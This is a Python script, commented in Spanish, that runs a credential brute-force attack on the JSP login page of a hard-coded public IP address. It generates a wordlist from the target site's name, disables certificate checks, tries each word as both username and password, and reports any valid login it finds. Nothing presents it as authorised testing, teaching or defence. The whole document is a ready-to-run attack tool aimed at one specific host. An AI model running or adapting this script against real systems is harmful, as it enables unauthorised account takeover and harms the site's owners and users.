import requests
import urllib3
import itertools

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SmartSitoBruteForce:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def generate_smart_wordlist(self):
        """Genera wordlist inteligente basada en 'SITO - MISITIO'"""
        print("[*] Generando wordlist inteligente...")
        
        # Basado en el patrón del nombre
        bases = ["sito", "misitio", "SITO", "MISITIO", "Sito", "Misitio"]
        suffixes = ["", "1", "12", "123", "1234", "2024", "2023", "2022", "admin", "user"]
        separators = ["", "-", "_", "."]
        
        wordlist = []
        
        for base in bases:
            for suffix in suffixes:
                for sep in separators:
                    if suffix:
                        wordlist.append(f"{base}{sep}{suffix}")
                    else:
                        wordlist.append(base)
        
        # Añadir combinaciones comunes
        combinations = list(itertools.product(bases, bases))
        for combo in combinations:
            if combo[0] != combo[1]:
                wordlist.append(f"{combo[0]}{combo[1]}")
                wordlist.append(f"{combo[0]}_{combo[1]}")
        
        return list(set(wordlist))  # Remover duplicados

    def smart_brute_force(self):
        """Fuerza bruta inteligente"""
        print("[*] Iniciando fuerza bruta inteligente...")
        
        wordlist = self.generate_smart_wordlist()
        print(f"[*] Wordlist generada: {len(wordlist)} combinaciones")
        
        # Probar cada palabra como usuario y contraseña
        for credential in wordlist[:50]:  # Probar primeras 50
            try:
                login_data = {
                    'yAccion': 'login',
                    'yIntentos': '1',
                    'yUsuario': '',
                    'xUsuario': credential,
                    'xContrasena': credential
                }
                
                response = self.session.post(f"{self.base_url}/jsp/login.jsp", 
                                           data=login_data, timeout=5)
                
                if response.status_code == 200:
                    # Buscar indicadores de éxito
                    if any(indicator in response.text for indicator in ['Bienvenido', 'Dashboard', 'Menú', 'logout']):
                        print(f"[!] ¡CREDENCIALES VÁLIDAS ENCONTRADAS!")
                        print(f"    Usuario: {credential}")
                        print(f"    Contraseña: {credential}")
                        return credential, credential
                    elif 'error' not in response.text.lower():
                        print(f"[+] Respuesta interesante con: {credential}")
                        
            except Exception as e:
                print(f"[-] Error con {credential}: {e}")
        
        print("[-] No se encontraron credenciales")

# Ejecutar fuerza bruta inteligente
smart_brute = SmartSitoBruteForce("189.254.143.102")
smart_brute.smart_brute_force()